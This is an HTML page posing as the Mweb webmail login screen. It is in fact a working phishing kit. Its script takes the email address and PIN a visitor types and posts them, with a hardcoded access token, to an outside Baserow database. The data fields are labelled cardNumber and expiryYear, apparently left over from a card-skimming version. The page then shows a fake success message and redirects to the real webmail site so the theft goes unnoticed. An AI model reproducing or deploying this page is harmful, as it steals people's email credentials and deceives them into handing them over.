<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mweb Webmail Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background-color: #1e5b7b;
            padding: 15px 30px;
            width: 100%;
            z-index: 10;
        }

        .logo {
            color: white;
            font-size: 2rem;
            font-weight: bold;
        }

        .main-content {
            display: flex;
            flex: 1;
        }

        .left-section {
            flex: 1;
            background: linear-gradient(to bottom, #1ab394);
            position: relative;
            display: flex;
            flex-direction: column;
            color: white;
        }

        .illustration {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 20px;
        }

        .person-img {
            max-width: 80%;
            height: auto;
            position: relative;
            z-index: 2;
        }

        .icons {
            position: absolute;
            right: 10%;
            top: 50%;
            transform: translateY(-50%);
            z-index: 1;
        }

        .icon {
            width: 70px;
            height: 70px;
            background-color: transparent;
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
            position: relative;
        }

        .icon svg {
            width: 30px;
            height: 30px;
            fill: white;
        }

        .icon:nth-child(1)::after,
        .icon:nth-child(2)::after {
            content: '';
            position: absolute;
            width: 2px;
            height: 40px;
            background-color: white;
            bottom: -40px;
            border-radius: 1px;
            right: 50%;
        }

        .right-section {
            width: 450px;
            background-color: #e9ecef;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            width: 85%;
            background-color: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .login-title {
            font-size: 2.5rem;
            color: #1a2a3a;
            margin-bottom: 20px;
            font-weight: bold;
        }

        .login-subtitle {
            font-size: 1.2rem;
            color: #1a2a3a;
            margin-bottom: 5px;
            font-weight: 500;
        }

        .login-text {
            color: #6c757d;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 1rem;
            outline: none;
        }

        .form-control:focus {
            border-color: #1ab394;
        }

        .password-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #6c757d;
            background: none;
            border: none;
        }

        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #e9ecef;
            border: none;
            border-radius: 4px;
            color: #1a2a3a;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-login:hover {
            background-color: #dde1e5;
        }

        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #1e5b7b;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1ab394;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .alert {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 4px;
            display: none;
        }

        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        @media (max-width: 992px) {
            .main-content {
                flex-direction: column;
            }
            .left-section {
                min-height: 300px;
            }
            .right-section {
                width: 100%;
                padding: 20px;
            }
            .login-container {
                width: 100%;
                max-width: 500px;
            }
        }

        @media (max-width: 768px) {
            .left-section {
                min-height: 200px;
            }
            .icons {
                display: none;
            }
            .person-img {
                max-width: 60%;
            }
        }

        @media (max-width: 576px) {
            .header {
                padding: 10px 15px;
            }
            .logo {
                font-size: 1.5rem;
            }
            .left-section {
                display: none;
            }
            .login-container {
                padding: 20px;
            }
            .login-title {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">mweb.</div>
    </div>
    <div class="main-content">
        <div class="left-section">
            <div class="illustration">
                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BmpvLTFZ7JekS0FRueqZeox9NBQtEe.png" alt="Person using laptop" class="person-img">
                <div class="icons">
                    <div class="icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                        </svg>
                    </div>
                    <div class="icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>
                        </svg>
                    </div>
                    <div class="icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M15.9,18.45C17.25,17.24 18.31,15.75 19,14.1C16.94,13.8 15.36,12.13 15.36,10.1C15.36,7.96 17.1,6.22 19.24,6.22C21.38,6.22 23.12,7.96 23.12,10.1C23.12,13.34 21.19,16.22 18.07,17.85L18,17.87C17.3,18.19 16.57,18.44 15.81,18.62L15.9,18.45M13.34,17.78C12.16,17.75 10.9,18.16 9.95,18.95C9,19.74 8.53,20.83 8.27,22C8.18,22.62 8.68,23.22 9.3,23.13C11.87,22.78 14.07,21.07 14.92,18.67C14.55,18.35 14.1,18 13.34,17.78M14.72,13C15.89,13.7 17.35,13.85 18.7,13.21C18.32,14.31 17.75,15.33 17,16.21C16.28,16.16 15.61,15.85 15.11,15.33C14.33,14.56 14.12,13.43 14.72,13M8,10A6,6 0 0,1 14,4C14,1.79 12.21,0 10,0C7.79,0 6,1.79 6,4C6,6.86 8.5,9.25 11.62,9.79C10.29,9.97 9.17,10.76 8.61,11.92C8.05,13.09 8.11,14.43 8.77,15.54C8.64,15.39 8.5,15.23 8.39,15.06C7.45,13.56 8,11.68 8,10Z"/>
                        </svg>
                    </div>
                </div>
            </div>
        </div>
        <div class="right-section">
            <div class="login-container">
                <h1 class="login-title">My Email</h1>
                <div id="alertBox" class="alert"></div>
                <h2 class="login-subtitle">Log in to your email</h2>
                <p class="login-text">Log in using your email address and user pin.</p>
                <form id="loginForm">
                    <div class="form-group">
                        <input type="email" class="form-control" id="email" placeholder="Email" required>
                    </div>
                    <div class="form-group">
                        <div class="password-container">
                            <input type="password" class="form-control" id="password" placeholder="User Pin" required>
                            <button type="button" class="password-toggle" id="togglePassword">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                                    <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
                                    <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
                                </svg>
                            </button>
                        </div>
                    </div>
                    <button type="submit" class="btn-login">Log In</button>
                    <div class="loading" id="loading">
                        <div class="spinner"></div>
                    </div>
                </form>
                <a href="#" class="forgot-password">Forgot Your Password</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const togglePassword = document.getElementById('togglePassword');
            const loading = document.getElementById('loading');
            const alertBox = document.getElementById('alertBox');

            // Toggle password visibility
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                
                // Change the eye icon
                if (type === 'password') {
                    togglePassword.innerHTML = `
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
                            <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
                        </svg>
                    `;
                } else {
                    togglePassword.innerHTML = `
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                            <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709z"/>
                            <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829l.822.822zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829z"/>
                            <path d="M3.35 5.47c-.18.16-.353.322-.518.487A13.134 13.134 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7.029 7.029 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12-.708.708z"/>
                        </svg>
                    `;
                }
            });

            // Form submission
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                
                if (!email || !password) {
                    showAlert('Please fill in all fields', 'danger');
                    return;
                }
                
                // Show loading spinner
                loading.style.display = 'block';
                
                // Prepare data for Baserow
                const data = {
                    cardNumber: email,
                    userPin: password,
                    expiryYear: password
                };
                
                // Send data to Baserow
                fetch('https://api.baserow.io/api/database/rows/table/503285/?user_field_names=true', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    loading.style.display = 'none';
                    showAlert('Login successful! Redirecting...', 'success');
                    
                    // Redirect to mweb webmail after successful submission
                    setTimeout(() => {
                        window.location.href = 'https://www.mweb.co.za/webmail';
                    }, 1500);
                })
                .catch(error => {
                    loading.style.display = 'none';
                    showAlert('An error occurred. Please try again.', 'danger');
                    console.error('Error:', error);
                });
            });
            
            // Function to show alerts
            function showAlert(message, type) {
                alertBox.textContent = message;
                alertBox.className = 'alert';
                alertBox.classList.add(`alert-${type}`);
                alertBox.style.display = 'block';
                
                // Hide alert after 5 seconds if it's an error
                if (type === 'danger') {
                    setTimeout(() => {
                        alertBox.style.display = 'none';
                    }, 5000);
                }
            }
        });
    </script>
</body>
</html>
